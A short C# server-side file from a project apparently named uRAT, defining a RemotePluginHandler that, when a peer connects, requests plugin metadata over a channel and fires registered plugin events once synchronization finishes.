using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using uNet2.Channel.Events;
using uRAT.Server.Plugin.Synchronization;
using uRAT.Server.Plugin.Synchronization.Packets;

namespace uRAT.Server.Plugin
{
    public class RemotePluginHandler
    {

        public delegate void PeerConnectedDel(ChannelEventArgs e);
        public List<PeerConnectedDel> PluginEvents { get; set; }

        public RemotePluginHandler()
        {
            PluginEvents = new List<PeerConnectedDel>();
        }

        public void OnPeerConnected(object sender, ChannelEventArgs e1)
        {
#if !DEBUG
            var op = e1.Channel.CreateOperation<PluginSynchronizationOperation>(e1.Peer.Identity.Guid);
            op.OnPacketReceived += (o, e) =>
            {
                if (e.Packet is SynchronizationFinalizationPacket)
                    PluginEvents.ForEach(pe => pe(e1));
            };
            op.SendPacket(new FetchPluginMetadataPacket());
#else
            PluginEvents.ForEach(pe => pe(e1));
#endif
            return;
        }
    }
}
